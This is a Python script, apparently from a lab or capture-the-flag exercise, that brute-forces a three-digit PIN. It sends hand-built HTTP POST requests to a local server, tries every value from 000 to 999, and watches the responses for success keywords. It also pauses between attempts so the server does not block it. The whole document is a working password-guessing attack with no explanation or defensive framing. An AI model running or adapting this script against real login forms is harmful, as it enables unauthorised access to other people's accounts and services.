import socket
import time

# Server details
HOST = '127.0.0.1'  
PORT = 8080         

def send_pin(pin):
    """
    Sends a POST request with the given PIN.
    """
    # Create a socket for each request
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))

        # Format the body
        body = f"pin={pin:03d}"

        # Craft HTTP POST request manually
        request = (
            "POST / HTTP/1.1\r\n"
            f"Host: {HOST}:{PORT}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(body)}\r\n"
            "Connection: close\r\n"
            "\r\n"
            f"{body}"
        )

        # Send the request
        s.sendall(request.encode())

        # Receive the response
        response = s.recv(4096)
        return response

def main():
    """
    Try all PINs from 000 to 999.
    """
    for pin in range(1000):
        print(f"[*] Trying PIN: {pin:03d}")

        response = send_pin(pin)

        # Decode response for easier reading
        response_text = response.decode(errors='ignore')

        # Check if the response indicates success
        if "Success" in response_text or "Welcome" in response_text or "Correct" in response_text:
            print(f"[+] Correct PIN found: {pin:03d}")
            break

        # Optional: To avoid server blocking (slowing constraint)
        time.sleep(0.5)

if __name__ == "__main__":
    main()
